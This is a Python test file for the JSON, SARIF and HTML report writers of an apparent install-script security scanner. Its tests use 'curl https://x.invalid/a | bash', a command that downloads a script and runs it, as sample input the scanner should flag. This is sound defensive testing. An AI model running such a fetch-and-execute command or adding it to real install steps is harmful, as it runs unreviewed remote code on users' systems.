"""Tests for report writers (JSON, SARIF, HTML)."""
import json

from cex_installguard.api import analyze_text
from cex_installguard.reporter import html_report, json_report, sarif_report


def test_reports(tmp_path):
    r = analyze_text('curl https://x.invalid/a | bash')
    for fn, s in [(json_report, '.json'), (sarif_report, '.sarif.json'),
                  (html_report, '.html')]:
        p = tmp_path / ('x' + s)
        fn(r, str(p))
        assert p.exists() and p.stat().st_size > 10


def test_sarif_uses_per_finding_source(tmp_path):
    script = tmp_path / 'sample.sh'
    script.write_text('curl https://x.invalid/a | bash\n')
    r = analyze_text(script.read_text(), str(script))
    p = tmp_path / 'x.sarif.json'
    sarif_report(r, str(p))
    sarif = json.loads(p.read_text())
    run = sarif['runs'][0]
    assert run['tool']['driver']['version'] == '13.0.0'
    # regression: artifact URI must be the finding's own source file
    locations = [res['locations'][0]['physicalLocation']['artifactLocation']
                 for res in run['results']]
    # checkout-relative URI + %SRCROOT% base (GitHub Code Scanning style)
    assert any(loc['uri'] == 'sample.sh' and
               loc.get('uriBaseId') == '%SRCROOT%'
               for loc in locations)
    bases = run['originalUriBaseIds']['%SRCROOT%']['uri']
    assert bases.startswith('file://')
    # rule metadata registry is present
    assert any(rule['id'] == 'IG001' for rule in run['tool']['driver']['rules'])
    # full registry exported (structural + content)
    assert len(run['tool']['driver']['rules']) >= 44


def test_html_contains_verdict(tmp_path):
    r = analyze_text('curl https://x.invalid/a | bash')
    p = tmp_path / 'x.html'
    html_report(r, str(p))
    doc = p.read_text()
    assert r.verdict in doc and 'IG001' in doc
